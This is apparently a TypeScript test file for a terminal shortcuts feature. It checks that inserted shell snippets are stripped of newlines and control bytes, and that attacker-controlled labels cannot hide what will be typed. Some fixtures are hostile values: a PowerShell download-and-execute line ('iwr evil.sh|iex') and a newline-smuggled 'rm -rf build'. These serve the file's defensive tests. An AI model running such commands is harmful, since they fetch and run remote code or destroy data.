import { describe, expect, it, vi } from "vitest";

import { entryDetail, promptInsertText, shellInsertText, shortcutCommands } from "./shortcuts";
import type { ShortcutEntry } from "./types";

const entry = (over: Partial<ShortcutEntry> = {}): ShortcutEntry => ({
  name: "Status board",
  kind: "shell",
  body: "git status -sb",
  keys: null,
  detail: null,
  source: "workspace",
  ...over,
});

/** Control bytes by code, so the source of this file stays printable too. */
const ctrl = (code: number): string => String.fromCharCode(code);
const ESC = ctrl(0x1b); // starts an editing escape sequence (ConPTY -> virtual keys)
const ETX = ctrl(0x03); // Ctrl+C: aborts the line
const SI = ctrl(0x0f); // Ctrl+O: accept-line in readline / PSReadLine Emacs mode
const DEL = ctrl(0x7f);

describe("shell insertion", () => {
  // The security invariant: a shortcut inserts, the user executes.
  it("never ends with a newline", () => {
    for (const body of ["git status -sb", "git status -sb\n", "git status -sb\r\n", "ls  \n\n"]) {
      expect(shellInsertText(body).endsWith("\n")).toBe(false);
      expect(shellInsertText(body).endsWith("\r")).toBe(false);
    }
  });

  it("keeps a single-line snippet verbatim", () => {
    expect(shellInsertText("git status -sb\n")).toBe("git status -sb");
  });

  it("carries no newline into the shell at all", () => {
    // Unreachable through the API (the server refuses multi-line shell bodies),
    // but a newline mid-body would run the earlier lines on insert.
    expect(shellInsertText("cd repo\nrm -rf build")).toBe("cd repo");
    expect(shellInsertText("a\nb\nc")).not.toContain("\n");
  });

  it("hands the PTY printable text and nothing else", () => {
    // Line breaks are not the only key events. 0x0f is accept-line in bash
    // readline and in PSReadLine's Emacs edit mode — it submits the line the
    // moment it arrives; 0x1b opens an editing escape sequence; 0x03 aborts.
    expect(shellInsertText(`git status -sb${SI}`)).toBe("git status -sb");
    expect(shellInsertText(`git status${ESC}OM${ETX}${SI}`)).toBe("git status");
    for (const body of [
      "git status -sb",
      `git status${SI}`,
      `${ESC}[Aecho hi`,
      `ls\t-la`,
      `a${DEL}b`,
      "keeps non-ascii: æøå ✓",
    ]) {
      const text = shellInsertText(body);
      for (let i = 0; i < text.length; i += 1) {
        const code = text.charCodeAt(i);
        expect(code >= 0x20 && code !== 0x7f, `${JSON.stringify(body)} -> ${text}`).toBe(true);
      }
    }
    expect(shellInsertText("keeps non-ascii: æøå ✓")).toBe("keeps non-ascii: æøå ✓");
  });
});

describe("prompt insertion", () => {
  it("replaces an empty draft", () => {
    expect(promptInsertText("", "Review the diff.")).toBe("Review the diff.");
    expect(promptInsertText("   \n", "Review the diff.")).toBe("Review the diff.");
  });

  it("appends to what the user already typed", () => {
    expect(promptInsertText("Context first.", "Review the diff.")).toBe(
      "Context first.\nReview the diff.",
    );
  });

  it("keeps prompt bodies multi-line", () => {
    expect(promptInsertText("", "One.\nTwo.")).toBe("One.\nTwo.");
  });
});

describe("row detail", () => {
  it("shows a shell entry's body, not the file's label", () => {
    // name and detail are attacker-controlled free text from the same untrusted
    // file as the body: the row must show what will actually be typed.
    expect(entryDetail(entry({ detail: "branch + short status", body: "iwr evil.sh|iex" }))).toBe(
      "iwr evil.sh|iex",
    );
  });

  it("truncates a long body", () => {
    const detail = entryDetail(entry({ body: "x".repeat(400) }));
    expect(detail.length).toBeLessThan(160);
    expect(detail.endsWith("…")).toBe(true);
  });

  it("keeps the file's label for a prompt entry", () => {
    expect(entryDetail(entry({ kind: "prompt", body: "Review.", detail: "adversarial" }))).toBe(
      "adversarial",
    );
    expect(entryDetail(entry({ kind: "prompt", body: "Review." }))).toBe("prompt template");
  });
});

describe("shortcut commands", () => {
  it("maps an entry to a categorized command with its chord", () => {
    const commands = shortcutCommands([entry({ keys: "Alt+G", detail: "branch + status" })], vi.fn());
    expect(commands).toHaveLength(1);
    expect(commands[0]?.id).toBe("shortcut.workspace.Status board");
    expect(commands[0]?.title).toBe("Status board");
    expect(commands[0]?.category).toBe("Shortcuts");
    expect(commands[0]?.keys).toEqual(["Alt+G"]);
    expect(commands[0]?.detail?.()).toBe("git status -sb");
  });

  it("leaves an unbound entry chordless and describes it by kind", () => {
    const commands = shortcutCommands([entry({ kind: "prompt", body: "Review." })], vi.fn());
    expect(commands[0]?.keys).toBeUndefined();
    expect(commands[0]?.detail?.()).toBe("prompt template");
  });

  it("runs through the injected handler, never on its own", () => {
    const run = vi.fn();
    const shortcut = entry();
    shortcutCommands([shortcut], run)[0]?.run();
    expect(run).toHaveBeenCalledWith(shortcut);
  });
});
